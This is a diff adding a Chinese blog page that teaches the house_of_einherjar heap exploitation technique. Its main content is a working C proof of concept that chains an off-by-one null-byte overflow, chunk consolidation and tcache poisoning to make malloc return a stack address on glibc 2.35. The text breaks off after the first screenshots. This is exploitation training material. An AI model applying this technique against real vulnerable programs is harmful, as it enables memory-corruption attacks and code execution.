@@ -1,0 +1,680 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/enter-line.ico">
+  <link rel="icon" href="/img/enter-line.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TKYmax">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="house_of_einherjar攻击介绍house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。 此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_einherjar攻击">
+<meta property="og:url" content="http://example.com/2025/09/10/house-of-einherjar%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="能打八个攻城狮">
+<meta property="og:description" content="house_of_einherjar攻击介绍house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。 此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910135914376.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910140335588.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910145711777.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910183124931.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910183847068.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910184611911.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910220533085.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910185034168.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910185112663.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221154143.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221240012.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221340660.png">
+<meta property="article:published_time" content="2025-09-10T05:35:36.000Z">
+<meta property="article:modified_time" content="2025-09-10T14:21:49.345Z">
+<meta property="article:author" content="TKYmax">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910135914376.png">
+  
+  
+  
+  <title>house_of_einherjar攻击 - 能打八个攻城狮</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>能打八个攻城狮</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="house_of_einherjar攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-10 13:35" pubdate>
+          2025年9月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">house_of_einherjar攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="house-of-einherjar攻击"><a href="#house-of-einherjar攻击" class="headerlink" title="house_of_einherjar攻击"></a>house_of_einherjar攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>house of einherjar</code> 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 <code>chunk</code> 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 <code>chunk</code>），从而使得尽可能避免碎片化。</p>
+<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 <code>prev_size</code>，还可以修改下一个堆块的 <code>PREV_INUSE</code> 比特位。</p>
+<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><ul>
+<li>可以修改下一个堆快的<code>prev_size</code>位和<code>PREV_INUSE</code> 比特位</li>
+<li>可以分配大于等于<code>unsortedbin</code>的<code>chunk</code></li>
+</ul>
+<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>演示<code>poc</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * 这个 House of Einherjar 的变种由 Huascar Tejeda - @htejeda 修改，</span><br><span class="hljs-comment">	 * 在开启 tcache 的 glibc-2.32 下仍然可用。</span><br><span class="hljs-comment">	 * </span><br><span class="hljs-comment">	 * House of Einherjar 技术利用了一个 “单字节溢出 null 字节” 的漏洞，</span><br><span class="hljs-comment">	 * 来控制 malloc() 返回的指针。</span><br><span class="hljs-comment">	 * 它还需要一个堆地址泄漏（heap leak）。</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * 在填满 tcache 链表（绕过与 fake chunk 合并的限制）之后，</span><br><span class="hljs-comment">	 * 我们针对 unsorted bin（而不是 small bin），</span><br><span class="hljs-comment">	 * 通过在堆上伪造一个 fake chunk 来实现攻击。</span><br><span class="hljs-comment">	 * </span><br><span class="hljs-comment">	 * 注意：对于正常的 bin，这个限制不允许我们创建比该 arena 从系统中申请的内存更大的 chunk：</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c </span><br><span class="hljs-comment">	 */</span><br><br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;欢迎来到 House of Einherjar 2!\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;测试环境: Ubuntu 22.04 64bit (glibc-2.35).\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;该技术在你有一个 malloc 堆块的单字节溢出（并且能写入 0x00）时可用。\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;本示例通过制造 chunk 重叠来演示 House of Einherjar 攻击。\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接着我们会利用 tcache poisoning 劫持控制流。\n&quot;</span><br>	       <span class="hljs-string">&quot;由于补丁 https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span><br>	       <span class="hljs-string">&quot;tcache poisoning 现在需要堆地址泄漏。\n&quot;</span>);<br><br>	<span class="hljs-comment">// 准备目标地址</span><br>	<span class="hljs-comment">// 由于 https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41</span><br>	<span class="hljs-comment">// 目标地址必须正确对齐</span><br>	<span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">0x10</span>];<br>	<span class="hljs-type">intptr_t</span> *target = <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-comment">// 选择一个正确对齐的目标地址</span><br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++) &#123;<br>		<span class="hljs-keyword">if</span>(((<span class="hljs-type">long</span>)&amp;stack_var[i] &amp; <span class="hljs-number">0xf</span>) == <span class="hljs-number">0</span>) &#123;<br>			target = &amp;stack_var[i];<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125;<br>	assert(target != <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n我们希望 malloc() 返回的地址是 %p.\n&quot;</span>, (<span class="hljs-type">char</span> *)target);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n申请一个 0x38 字节的堆块 &#x27;a&#x27;，用它来伪造一个 fake chunk。\n&quot;</span>);<br>	<span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br>	<span class="hljs-comment">// 伪造一个 fake chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n我们在目标 chunk 之前伪造一个 fake chunk，并且需要知道它的地址。\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;为了通过 unlink 检查，我们设置 fwd 和 bck 指针指向自己。\n&quot;</span>);<br><br>	a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;	<span class="hljs-comment">// prev_size (没用)</span><br>	a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>	a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// fwd</span><br>	a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// bck</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们的 fake chunk 在 %p，看起来如下:\n&quot;</span>, a);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (未使用): %#lx\n&quot;</span>, a[<span class="hljs-number">0</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="hljs-number">2</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, a[<span class="hljs-number">3</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n再申请一个 0x28 字节的堆块 &#x27;b&#x27;。\n&quot;</span><br>	       <span class="hljs-string">&quot;稍后会通过溢出 &#x27;b&#x27; 的一个字节，修改 &#x27;c&#x27; 的元数据。\n&quot;</span><br>	       <span class="hljs-string">&quot;等 &#x27;b&#x27; 重叠后释放，就能用来发起 tcache poisoning。\n&quot;</span>);<br>	<span class="hljs-type">uint8_t</span> *b = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>	<span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;因为我们要溢出 b，所以要知道它的真实大小（对齐后的大小）：%#x\n&quot;</span>, real_b_size);<br><br>	<span class="hljs-comment">/* 最好让 chunk 的 size 字段最低字节为 0x00。</span><br><span class="hljs-comment">	 * 因为 chunk 大小包含了用户申请的大小 + 元数据对齐，</span><br><span class="hljs-comment">	 * 所以选 0xf8 这种大小，得到的 size 字段最低字节正好为 0x00。 */</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n申请一个 0xf8 字节的堆块 &#x27;c&#x27;。\n&quot;</span>);<br>	<span class="hljs-type">uint8_t</span> *c = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>	<span class="hljs-type">uint64_t</span>* c_size_ptr = (<span class="hljs-type">uint64_t</span>*)(c - <span class="hljs-number">8</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.size 实际是 (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们通过溢出 &#x27;b&#x27; 的一个字节，把 &#x27;c&#x27; 的 size 改掉（写 0x00）。\n&quot;</span>);<br>	<span class="hljs-comment">// 漏洞点</span><br>	b[real_b_size] = <span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;修改后的 c.size: %#lx\n&quot;</span>, *c_size_ptr);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;最好让 b 的大小是 0x100 的倍数，这样只会改 prev_inuse 位，不会改 b 的大小。\n&quot;</span>);<br><br>	<span class="hljs-comment">// 在 b 结尾写入一个 fake prev_size</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n在 &#x27;b&#x27; 的最后 %lu 字节写入一个假的 prev_size，&quot;</span><br>	       <span class="hljs-string">&quot;这样它会与我们的 fake chunk 合并。\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>	<span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((c - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*) a);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake prev_size = %p - %p = %#lx\n&quot;</span>, c - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>, a, fake_size);<br>	*(<span class="hljs-type">size_t</span>*) &amp;b[real_b_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>	<span class="hljs-comment">// 修改 fake chunk 的 size，与 c 的新 prev_size 一致</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n确保 fake chunk 的 size 与 c 的新 prev_size 一样。\n&quot;</span>);<br>	a[<span class="hljs-number">1</span>] = fake_size;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在 fake chunk 的大小为 %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-comment">// 先填满 tcache，再 free 掉 c 让它合并 fake chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n填满 tcache。\n&quot;</span>);<br>	<span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>		x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>	&#125;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;释放这些 chunk，填满 tcache 列表。\n&quot;</span>);<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>		<span class="hljs-built_in">free</span>(x[i]);<br>	&#125;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在释放 &#x27;c&#x27;，它会和 fake chunk 合并，因为 c 的 prev_inuse 已经被清掉。\n&quot;</span>);<br>	<span class="hljs-built_in">free</span>(c);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake chunk 的大小变为 %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n现在再 malloc()，它会返回 fake chunk。\n&quot;</span>);<br>	<span class="hljs-type">intptr_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x158</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x158) 返回 %p\n&quot;</span>, d);<br><br>	<span class="hljs-comment">// tcache poisoning</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;补丁 https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f\n&quot;</span><br>	       <span class="hljs-string">&quot;要求我们多申请/释放一个填充 chunk 来绕过 fd 校验。\n&quot;</span>);<br>	<span class="hljs-type">uint8_t</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>	<span class="hljs-built_in">free</span>(pad);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n现在释放 &#x27;b&#x27;，准备做 tcache poisoning。\n&quot;</span>);<br>	<span class="hljs-built_in">free</span>(b);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcache 链表现在是 [ %p -&gt; %p ].\n&quot;</span>, b, pad);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们通过 &#x27;d&#x27; 覆盖 b 的 fwd 指针。\n&quot;</span>);<br>	<span class="hljs-comment">// 注意：需要堆地址泄漏才能算出 d 的地址</span><br>	<span class="hljs-comment">// 但 House of Einherjar 本身也要求堆泄漏，所以可以直接用。</span><br>	d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)&amp;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">12</span>);<br><br>	<span class="hljs-comment">// 取出 target</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在我们可以申请到 target 地址。\n&quot;</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>	<span class="hljs-type">intptr_t</span> *e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n新分配的 chunk 在 %p\n&quot;</span>, e);<br><br>	<span class="hljs-comment">// 验证</span><br>	assert(e == target);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功控制了 target（栈地址）！\n\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>堆空间申请，申请了三个利用堆块，<code>chunk1</code>进行了伪造，把<code>fd</code>和<code>bk</code>制作伪造为自身。利用<code>chunk2</code>进行溢出伪造<code>chunk3</code>的<code>prev_size</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910135914376.png" srcset="/img/loading.gif" lazyload alt="image-20250910135907246"></p>
+<p>然后把<code>tcachebins</code>填满，去<code>free chunk3</code>，效果如下，堆块进行了合并，造成了堆块重叠</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910140335588.png" srcset="/img/loading.gif" lazyload alt="image-20250910140335503"></p>
